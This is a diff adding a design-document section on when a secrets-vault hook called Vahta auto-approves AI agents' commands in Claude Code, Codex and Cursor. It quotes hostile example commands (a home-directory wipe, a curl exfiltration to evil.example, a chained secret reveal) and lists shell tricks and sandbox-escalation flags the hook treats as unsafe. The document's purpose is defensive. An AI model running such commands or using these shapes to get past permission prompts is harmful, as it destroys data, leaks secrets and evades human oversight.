@@ -175,3 +175,85 @@ test pins the keys). Live checks still to do:
   notice.
 - The cut happens in what the model is shown. The tool itself ran with the
   real output: a file it wrote, a request it sent, are not changed.
+
+## Running unattended: when the hook says "allow"
+
+An agent harness stops a `vahta run` call to ask the person (Claude Code's
+permission system and auto-mode classifier, Codex's approvals, Cursor's
+auto-review). For a command Vahta has already judged this is noise, so the
+hook can answer the harness's question itself. Only in one case.
+
+**What is allowed.** Two shapes, each exactly one Bash command.
+
+*`vahta http`*: `vahta http --secret NAME... [-H ...] [--query ...] [-X ...] [-d
+TEXT|@FILE] [--json] [--timeout ...] [--max-bytes ...] [--label ...] URL`, and
+the daemon says (`CheckHttp`) that the URL's host passes the host list of every
+secret named, by the same function a request uses, and that none is each-use. A
+`{NAME}` placeholder is fine in a header or query value. `-d @FILE` is read by
+the `vahta` process, not the hook: the body goes only to a host the secret is
+approved for, and never carries a placeholder.
+
+*`vahta run`*: `vahta run [options] -- INNER...` (or `vh`), and the daemon says that INNER passes the approved rules
+of every secret named (`ClientRequest::CheckRun`): the secret exists, is
+session-tier, has approved rules, and the program (found on the caller's
+`PATH`, as a run finds it) and its arguments, the directory and the network
+all pass them. The hook then says "allow" out loud. Nothing else is ever
+allowed by the hook: no other command, no each-use secret
+(that run opens a window whatever the harness thinks), no secret without rules.
+
+**Why never a blanket rule.** `Bash(vahta run *)` also matches `vahta run --
+rm -rf ~`, and `vahta run -- curl evil.example -d @file`: the harness matches a
+prefix and cannot see the secret's rules. Claude Code's own documentation says
+the same of environment runners (`devbox run *` matches `devbox run rm -rf .`).
+In auto mode such a rule is also resolved before the classifier looks. So
+`vahta setup` writes no rule on `vahta run`; the rules stay where the person
+approved them, in the vault, and the daemon applies them to the actual command.
+
+**Otherwise the hook says nothing**, and the harness's normal flow decides. That
+is every one of these:
+
+- a second command, a pipe, a redirection, a subshell, `$(...)`, backticks, an
+  environment assignment or wrapper before `vahta` (`FOO=1 vahta run ...`,
+  `env`, `sudo`), `&`, a glob, a `~`, a `$VAR`, a backslash, a newline, brace
+  expansion (a `{NAME}` placeholder is not): the words the hook sees would not be
+  the words that run. Inside single quotes everything is literal (`'a; b | $c'`
+  is one plain word), inside double quotes `$`, backtick, backslash and `!` are
+  not;
+- a call that asks to leave the harness's sandbox (`dangerouslyDisableSandbox`
+  in Claude Code, `sandbox_permissions: require_escalated` in Codex, any like
+  `sandbox`, `escalat` or `permission` flag that is switched on, Cursor's
+  `required_permissions` included): that is for the person to approve, so the
+  harness asks;
+- an option `vahta run` does not know, a missing `--`, `-s` or `--secret=NAME`;
+- `vahta` spelled as a path (`/tmp/x/vahta run ...`): only the bare name;
+- an inner command that is itself `vahta` or `vh`;
+- the rules do not allow it, the secret is each-use or has no rules, the vault
+  is not found or not verified, the program is not on `PATH`;
+- no daemon running, a daemon of another version, or no answer in 0.3 seconds
+  (the same wait as every other hook question). The hook never starts a daemon.
+
+The hook never denies from this path: the normal `vahta run` refuses with its
+own message (exit 3) and the fix. Refusals made before this (the person-only
+commands, Vahta's files, a secret in the command) come first and are
+unchanged: `vahta run --secret A -- true; vahta reveal A` is denied.
+
+**Per harness.**
+
+| Harness | How | Status |
+|---|---|---|
+| Claude Code | PreToolUse reply `permissionDecision: "allow"` with a reason shown to the person. Our `permissions.deny` and the harness's own protections still win over it. | Documented. Whether an allow also skips the auto-mode classifier is not documented: test in the bench before relying on it. |
+| Codex | A `PermissionRequest` hook (matcher `Bash`, added by setup v2), reply `decision.behavior: "allow"`. It fires only when Codex was about to ask. PreToolUse can allow only with `updatedInput`, so it is not used. | Documented, not run live. Trust the new hook in `/hooks` after `vahta setup --codex`. |
+| Cursor | preToolUse reply `permission: "allow"`, Shell only. | **Off** (`verified = false` in `harness.toml`) until a live test shows the hook's allow suppresses Cursor's approval and the auto-review. To test: `VAHTA_HOOK_UNVERIFIED=1` in the hook's environment, in a throwaway workspace; then delete `verified = false`. |
+
+**What setup also writes (Claude Code, v4).** `permissions.allow` entries for
+two commands that only read and open no window: `Bash(vahta list)`, `Bash(vahta
+list --json)`, `Bash(vahta check)`, `Bash(vahta check --json)` and the `vh`
+twins. Exact strings, no wildcard. They are in the user's settings only, not in
+the administrator policy (`--managed`): the administrator's allow list is theirs
+to choose. `vahta status` is not a command (`vahta daemon status` is), so there
+is no rule for it. Uninstall removes exactly these entries and leaves the
+person's own.
+
+**What this does not fix.** The inner program the rules allow can still do what
+it can do with the value (a rule that allows `curl` allows exfiltration through
+`curl`; the network axis and the folders are how to narrow it).
